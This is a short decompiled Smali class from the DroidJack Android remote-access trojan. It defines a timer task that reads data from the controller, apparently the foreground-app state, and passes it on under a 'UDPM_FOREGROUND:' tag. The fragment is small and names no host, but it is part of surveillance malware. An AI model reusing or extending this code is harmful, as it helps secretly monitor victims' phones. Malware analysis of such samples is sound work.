.class Lnet/droidjack/server/y;
.super Ljava/util/TimerTask;


# instance fields
.field final synthetic a:Lnet/droidjack/server/Controller;


# direct methods
.method constructor <init>(Lnet/droidjack/server/Controller;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/y;->a:Lnet/droidjack/server/Controller;

    invoke-direct {p0}, Ljava/util/TimerTask;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    :try_start_0
    const-string v0, "UDPM_FOREGROUND:"

    new-instance v1, Ljava/lang/String;

    sget-object v2, Lnet/droidjack/server/Controller;->q:Lnet/droidjack/server/bf;

    invoke-virtual {v2}, Lnet/droidjack/server/bf;->h()[B

    move-result-object v2

    const-string v3, "UTF-8"

    invoke-direct {v1, v2, v3}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    invoke-static {v0, v1}, Lnet/droidjack/server/Controller;->a(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method
